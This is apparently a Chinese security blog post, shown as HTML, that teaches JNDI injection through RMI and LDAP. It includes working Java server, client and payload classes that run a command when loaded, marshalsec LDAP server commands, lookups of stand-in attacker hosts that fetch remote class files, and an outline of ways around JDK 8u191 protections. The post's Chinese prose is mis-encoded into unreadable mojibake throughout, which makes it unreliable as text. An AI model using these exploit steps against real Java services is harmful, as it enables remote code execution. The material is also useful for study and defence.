java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jndi</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>; <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹åˆ°<code>Reference</code>,å¹¶æ²¡æœ‰å®ç°<code>Remote</code>æ¥å£ä¹Ÿæ²¡æœ‰ç»§æ‰¿ <code>UnicastRemoteObject</code>ç±»ï¼Œå‰é¢è®²RMIçš„æ—¶å€™è¯´è¿‡ï¼Œå°†ç±»æ³¨å†Œåˆ°<code>Registry</code>éœ€è¦å®ç°<code>Remote</code>å’Œç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ã€‚</p><p>è¿™é‡Œå¹¶æ²¡æœ‰çœ‹åˆ°ç›¸å…³çš„ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦è°ƒç”¨<code>ReferenceWrapper</code>å°†ä»–ç»™å°è£…ä¸€ä¸‹ã€‚</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP(<code>Lightweight Directory Access Protocol</code>)ï¼šè½»é‡ç›®å½•è®¿é—®åè®®</p><p>ç±»ä¼¼äºæ•°æ®åº“ã€‚</p><p>1.<br>   åŸºäºTCP&#x2F;IPåè®®<br>2. åˆ†æˆæœåŠ¡ç«¯&#x2F;å®¢æˆ·ç«¯ï¼šæœåŠ¡ç«¯å­˜å‚¨æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯è¿æ¥è¿›è¡Œæ“ä½œ<br>3. ç›¸å¯¹äº<code>mysql</code>çš„è¡¨å‹å­˜å‚¨ï¼Œä¸åŒçš„æ˜¯<code>LDAP</code>ä½¿ç”¨<strong>æ ‘å‹å­˜å‚¨</strong></p><ul><li><code>dn</code>ï¼š<code>domain name</code>ç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªé¡¹ï¼Œç±»ä¼¼äºMYSQLä¸»é”®<ul><li><code>dc</code>: <code>domain compose</code></li><li><code>ou</code>ï¼š<code>organization unit</code></li><li><code>uid</code></li></ul></li></ul><p>LDAPåè®®ä¸»è¦ç”¨äºå•ç‚¹ç™»å½•SSO(Single Sign on)</p><h2 id="JNDI-Attack"><a href="#JNDI-Attack" class="headerlink" title="JNDI Attack"></a>JNDI Attack</h2><p>ä¸ºäº†åœ¨å‘½åæœåŠ¡æˆ–ç›®å½•æœåŠ¡ä¸­ç»‘å®š<code>Java</code>å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>Java</code>åºåˆ—åŒ–æ¥ä¼ è¾“å¯¹è±¡ï¼Œä½†æœ‰æ—¶å€™ä¸å¤ªåˆé€‚ï¼Œæ¯”å¦‚<code>Java</code>å¯¹è±¡è¾ƒå¤§çš„æƒ…å†µã€‚</p><p>å› æ­¤JNDIå®šä¹‰äº†å‘½åå¼•ç”¨(<code>Naming References</code>)ï¼Œåé¢ç›´æ¥ç®€ç§°å¼•ç”¨(<code>References</code>)ã€‚</p><p>è¿™æ ·å¯¹è±¡å°±å¯ä»¥é€šè¿‡ç»‘å®šä¸€ä¸ªå¯ä»¥è¢«å‘½åç®¡ç†å™¨(<code>Naming Manager</code>)è§£ç (<code>decodeObject</code>)å¹¶è§£æä¸ºåŸå§‹å¯¹è±¡çš„å¼•ç”¨ï¼Œé—´æ¥åœ°å­˜å‚¨åœ¨å‘½åæˆ–ç›®å½•æœåŠ¡ä¸­ã€‚</p><p>å¼•ç”¨ç”±<code>Reference</code>ç±»æ¥è¡¨ç¤ºï¼Œå®ƒç”±åœ°å€(<code>RefAddress</code>)çš„æœ‰åºåˆ—è¡¨å’Œæ‰€å¼•ç”¨å¯¹è±¡çš„ä¿¡æ¯ç»„æˆã€‚è€Œæ¯ä¸ªåœ°å€åŒ…å«äº†å¦‚ä½•æ„é€ å¯¹åº”çš„å¯¹è±¡çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¼•ç”¨å¯¹è±¡çš„<code>Java</code>ç±»åï¼Œä»¥åŠç”¨äºåˆ›å»ºå¯¹è±¡çš„<code>ObjectFactory</code>ç±»çš„åç§°å’Œä½ç½®ã€‚ </p><p><code>Reference</code>å¯ä»¥ä½¿ç”¨<code>ObjectFactory</code>æ¥æ„é€ å¯¹è±¡ã€‚å½“ä½¿ç”¨<code>lookup()</code>æ–¹æ³•æŸ¥æ‰¾å¯¹è±¡æ—¶ï¼Œ<code>Reference</code>å°†ä½¿ç”¨æä¾›çš„<code>ObjectFactory</code>ç±»çš„åŠ è½½åœ°å€æ¥åŠ è½½<code>ObjectFactory</code>ç±»ï¼Œ<code>ObjectFactory</code>ç±»å°†æ„é€ å‡ºéœ€è¦çš„å¯¹è±¡ã€‚</p><p><strong>æ‰€è°“çš„ <code>JNDI</code> æ³¨å…¥å°±æ˜¯æ§åˆ¶ <code>lookup</code> å‡½æ•°çš„å‚æ•°ï¼Œè¿™æ ·æ¥ä½¿å®¢æˆ·ç«¯è®¿é—®æ¶æ„çš„ <code>RMI</code> æˆ–è€… <code>LDAP</code> æœåŠ¡æ¥åŠ è½½æ¶æ„çš„å¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œå®Œæˆåˆ©ç”¨ã€‚</strong> </p><p>åœ¨ <code>JNDI</code> æœåŠ¡ä¸­ï¼Œé€šè¿‡ç»‘å®šä¸€ä¸ªå¤–éƒ¨è¿œç¨‹å¯¹è±¡è®©å®¢æˆ·ç«¯è¯·æ±‚ï¼Œä»è€Œä½¿å®¢æˆ·ç«¯æ¶æ„ä»£ç æ‰§è¡Œçš„æ–¹å¼å°±æ˜¯åˆ©ç”¨ <code>Reference</code> ç±»å®ç°çš„ã€‚<code>Reference</code> ç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½å&#x2F;ç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>å…·ä½“åˆ™æ˜¯æŒ‡å¦‚æœè¿œç¨‹è·å– <code>RMI</code> æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ä¸º <code>Reference</code> ç±»æˆ–è€…å…¶å­ç±»æ—¶ï¼Œåˆ™å¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½æ¶æ„ <code>class</code> å­—èŠ‚ç æ–‡ä»¶æ¥å®ä¾‹åŒ– <code>Reference</code> ç±»å¸¸ç”¨å±æ€§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">className è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å <br>classFactory åŠ è½½çš„ class ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§° <br>classFactoryLocation æä¾› classes æ•°æ®çš„åœ°å€å¯ä»¥æ˜¯ file/ftp/http ç­‰åè®®<br></code></pre></td></tr></table></figure><p>å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> ); <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure><p>å‡å¦‚å®¢æˆ·ç«¯ä½¿ç”¨RMIåè®®ï¼Œlookupè¯·æ±‚æœåŠ¡ç«¯bindçš„Exploitç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯åœ¨æœ¬åœ° <code>CLASSPATH</code> æŸ¥æ‰¾ <code>Exploit</code> ç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ ¹æ®è®¾å®šçš„ <code>Reference</code> å±æ€§ï¼Œ</p><p>åˆ°<code>URL</code>ï¼š <code>http://evilHost/Exploit.class</code> è·å–æ„é€ å¯¹è±¡å®ä¾‹ï¼Œæ„é€ æ–¹æ³•ä¸­çš„æ¶æ„ä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p><h3 id="JNDI-References-æ³¨å…¥"><a href="#JNDI-References-æ³¨å…¥" class="headerlink" title="JNDI References æ³¨å…¥"></a>JNDI References æ³¨å…¥</h3><p>JNDIä¸­å¯¹è±¡çš„ä¼ é€’æœ‰ä¸¤ç§ï¼š</p><ul><li>åºåˆ—åŒ–</li><li>å¼•ç”¨</li></ul><p><strong>å¯¹äºå¼•ç”¨ï¼Œè‹¥å®¢æˆ·ç«¯<code>lookup()</code>çš„å†…å®¹å¯æ§ï¼Œæ§åˆ¶å®¢æˆ·ç«¯å»è®¿é—®æ¶æ„çš„æœåŠ¡ä¸­å¿ƒï¼ˆ<code>rmiã€ldap</code>ï¼‰ï¼Œè·å–æ¶æ„çš„å¼•ç”¨ï¼Œè¿›è€Œè·å–æ¶æ„è¿œç¨‹æœåŠ¡å™¨çš„æ¶æ„classæ–‡ä»¶è¿›è¡Œæ‰§è¡Œã€‚</strong></p><p><img src="/2024/07/30/JNDI/image-20240730204623748.png" alt="image-20240730204623748"></p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><ol><li>æ”»å‡»è€…é€šè¿‡å¯æ§çš„ URI å‚æ•°è§¦å‘åŠ¨æ€ç¯å¢ƒè½¬æ¢ï¼Œä¾‹å¦‚è¿™é‡Œ URI ä¸º <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;refObj</strong></li><li>åŸå…ˆé…ç½®å¥½çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ ä¼šå› ä¸ºåŠ¨æ€ç¯å¢ƒè½¬æ¢è€Œè¢«æŒ‡å‘ <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;</strong></li><li>åº”ç”¨å» <strong>rmi:&#x2F;&#x2F;evil.com:1099</strong> è¯·æ±‚ç»‘å®šå¯¹è±¡ refObjï¼Œæ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„ RMI æœåŠ¡ä¼šè¿”å›ä¸åç§° refObj ç»‘å®šçš„ReferenceWrapper å¯¹è±¡</li><li>åº”ç”¨è·å–åˆ° ReferenceWrapper å¯¹è±¡å¼€å§‹ä»æœ¬åœ° <strong>CLASSPATH</strong> ä¸­æœç´¢ EvilObject ç±»ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šä»æ¶æ„è¿œç¨‹æœåŠ¡å™¨ä¸Šå»å°è¯•è·å– <strong>EvilObject.class</strong>ï¼Œå³åŠ¨æ€çš„å»è·å– <code>http://evil-cb.com/EvilObject.class</code></li><li>æ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„æœåŠ¡è¿”å›ç¼–è¯‘å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ <strong>EvilObject.class</strong></li><li>åº”ç”¨å¼€å§‹è°ƒç”¨ <strong>EvilObject</strong> ç±»çš„æ„é€ å‡½æ•°ï¼Œå› æ”»å‡»è€…äº‹å…ˆå®šä¹‰åœ¨æ„é€ å‡½æ•°ï¼Œè¢«åŒ…å«åœ¨é‡Œé¢çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œ</li></ol><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><ul><li>JDK 6u45ã€7u21ä¹‹åï¼šjava.rmi.server.useCodebaseOnly é»˜è®¤å€¼è¢«è®¾ç½®ä¸º trueã€‚å°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„java.rmi.server.codebaseæŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯JVMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚</li><li>JDK 6u132ã€7u122ã€8u113ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.rmi.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚</li><li>JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.ldap.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚</li></ul><p><img src="/2024/07/30/JNDI/image-20240730204805160.png" alt="image-20240730204805160"></p><p>å¯¹äºJNDIé«˜ç‰ˆæœ¬ç»•è¿‡ï¼Œå½“ç„¶ä¹Ÿæœ‰æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘å†åšå®¢å›­ä¹Ÿå†™è¿‡ï¼š</p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>è¯¦ç»†çš„åé¢ä¹Ÿä¼šå†å†™å†™ã€‚</p><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h3><h4 id="attack-1"><a href="#attack-1" class="headerlink" title="attack"></a>attack</h4><p>å†™ä¸ªæœ€åŸºç¡€çš„æ–¹å¼ï¼š</p><p>RMIServerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIClientï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>calc.javaç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œ<code>python -m http.server 8080</code>èµ·WebæœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ç«¯ã€å®¢æˆ·ç«¯ï¼Œè§¦å‘å®¢æˆ·ç«¯å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">æ³¨ï¼šServerçš„urlç«¯å£åé¢ä¸€å®šè¦æœ‰æ–œçº¿ï¼ˆ/ï¼‰ï¼ï¼ï¼<br><br>è¿™é‡Œçš„æ¶æ„ç±»calc.javaå®é™…ä¸Šæœ€å¥½å®ç°javax.naming.spi.ObjectFactoryæ¥å£ï¼Œå¹¶é‡å†™getObjectInstanceæ–¹æ³•ï¼Œå¦åˆ™å®¢æˆ·ç«¯è¯·æ±‚å¾—åˆ°å­—èŠ‚ç æ–‡ä»¶åï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼ˆå¯èƒ½å°±æ˜¯å› ä¸ºcalc.javaæ²¡æœ‰å®ç°ObjectFactoryæ¥å£ï¼‰<br></code></pre></td></tr></table></figure><h4 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h4><p>JDK 6u132ã€7u122ã€8u113ä¹‹åï¼šå¢åŠ äº† <code>com.sun.jndi.rmi.object.trustURLCodebase</code> é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ã€‚</p><p>åœ¨<code>RegistryContext</code>ä¸­ï¼Œä¼šåˆ¤æ–­ <code>trustURLCodebase</code>ï¼Œé»˜è®¤ä¸ºfalse</p><p><img src="/2024/07/30/JNDI/image-20240730210709177.png" alt="image-20240730210709177"></p><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h3><h4 id="attack-2"><a href="#attack-2" class="headerlink" title="attack"></a>attack</h4><p><code>LDAP</code>æœåŠ¡ä¸­<code>lookup</code>æ–¹æ³•ä¸­æŒ‡å®šçš„è¿œç¨‹åœ°å€ä½¿ç”¨çš„æ˜¯<code>LDAP</code>åè®®ï¼Œç”±æ”»å‡»è€…æ§åˆ¶<code>LDAP</code>æœåŠ¡ç«¯è¿”å›ä¸€ä¸ªæ¶æ„<code>jndi Reference</code>å¯¹è±¡ï¼Œå¹¶ä¸”<code>LDAP</code>æœåŠ¡çš„<code>Reference</code>è¿œç¨‹åŠ è½½<code>Factory</code>ç±»å¹¶ä¸æ˜¯ä½¿ç”¨<code>RMI Class Loader</code>æœºåˆ¶ï¼Œå› æ­¤ä¸å—<code>trustURLCodebase</code>é™åˆ¶ã€‚</p><p>ldapçš„å®ç°ä»£ç è¾ƒå¤šï¼Œè¿™é‡Œä½¿ç”¨å·¥å…·<code>marshalsec</code>æ¥å¯åŠ¨LDAPæœåŠ¡</p><h4 id="marshalsecä¸‹è½½åŠä½¿ç”¨"><a href="#marshalsecä¸‹è½½åŠä½¿ç”¨" class="headerlink" title="marshalsecä¸‹è½½åŠä½¿ç”¨"></a>marshalsecä¸‹è½½åŠä½¿ç”¨</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>mavenæ‰“åŒ…ä¸ºjaråŒ…ï¼š<code>mvn clean package -DskipTests</code></p><p>é¡¹ç›®ä¼šå¤šå‡ºä¸€ä¸ªtargetç›®å½•ï¼Œè¿›å…¥å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„jaråŒ…</p><p>å¼€å¯ldapæœåŠ¡ï¼š<code>java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 8099</code></p><p>ä½œç”¨æ˜¯å°†LDAPæŸ¥è¯¢è¯·æ±‚é‡å®šå‘åˆ°<code>http://127.0.0.1:8000/#calc</code>ï¼Œcalcä¸ºæ¶æ„ä»£ç ç¼–è¯‘å¾—åˆ°çš„classæ–‡ä»¶</p><p><code>python -m http.server 8000</code>ä¸‹æ”¾calc.class</p><p><strong>æ³¨æ„ï¼šcalc.javaä¸è¦åŒ…å«åŒ…åï¼Œå¦åˆ™åœ¨è¿œç¨‹è°ƒç”¨çš„æ—¶å€™ä¼šå› ä¸ºç±»åä¸æ­£ç¡®è€ŒæŠ¥é”™</strong></p><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢ldapçš„åœ°å€ä¸ºï¼š<code>ldap://127.0.0.1:8099/aaa</code>ï¼Œåé¢çš„aaaæ˜¯éšä¾¿å†™çš„ç”¨äºDNæŸ¥æ‰¾çš„å­—ç¬¦</p><p><img src="/2024/07/30/JNDI/image-20240730211225200.png" alt="image-20240730211225200"></p><p>è¿‡ç¨‹å…¶å®å°±æ˜¯</p><p><code>getObjectFactoryFromReference</code> &#x3D;&gt; <code>loadClass</code> &#x3D;&gt; æœ¬åœ°<code>AppClassLoader</code>æ‰¾ä¸åˆ° &#x3D;&gt; <code>URLClassLoader</code></p><h4 id="Patch-1"><a href="#Patch-1" class="headerlink" title="Patch"></a>Patch</h4><p>8u191ä¹‹åè¿›è¡Œäº†ä¿®è¡¥ï¼Œ loadClassæ–¹æ³•ä¸­æ·»åŠ  trustURLCodebase å±æ€§ï¼Œæ‰€ä»¥ä¸èƒ½è¿œç¨‹åŠ è½½äº†ã€‚</p><h2 id="JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡"><a href="#JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡" class="headerlink" title="JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡"></a>JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡</h2><p>å¯è§<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>é’ˆå¯¹8u191çš„ç»•è¿‡å¤§è‡´ä¸¤ç§é€”å¾„</p><ol><li>æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°<code>CLASSPATH</code>ä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„<code>Reference Factory</code>å·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„<code>Factory</code>ç±»æ‰§è¡Œå‘½ä»¤ã€‚</li><li>åˆ©ç”¨<code>LDAP</code>ç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–<code>Gadget</code>å®Œæˆå‘½ä»¤æ‰§è¡Œã€‚</li></ol><ul><li>æ—¢ç„¶è¿œç¨‹ä¸èƒ½æ‰“ï¼Œå°±æ‰¾æœ¬åœ°æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„ç±»ã€‚æœåŠ¡ç«¯è¿”å›çš„<code>Reference</code>å¯¹è±¡ä¸­åŒ…å«æœ¬åœ°å­˜åœ¨çš„å¯åˆ©ç”¨<code>Factory</code>ç±»ï¼Œ<code>loadClass</code>åï¼Œåˆ›å»ºå®ä¾‹å¯¹è±¡ï¼Œè°ƒç”¨å…¶ <code>getObjectInstance</code> æ–¹æ³•ã€‚ï¼ˆè¯¥<code>Factory</code>ç±»éœ€è¦å®ç° <strong><code>javax.naming.spi.ObjectFactory</code></strong> æ¥å£ï¼Œè¿˜è¦é‡å†™å…¶ <code>getObjectInstance</code> æ–¹æ³•ï¼‰</li><li>é€šè¿‡LDAPçš„ <code>javaSerializedData</code>ååºåˆ—åŒ–<code>gadget</code>ã€‚LDAPæœåŠ¡ç«¯é™¤äº†æ”¯æŒ<code>JNDI 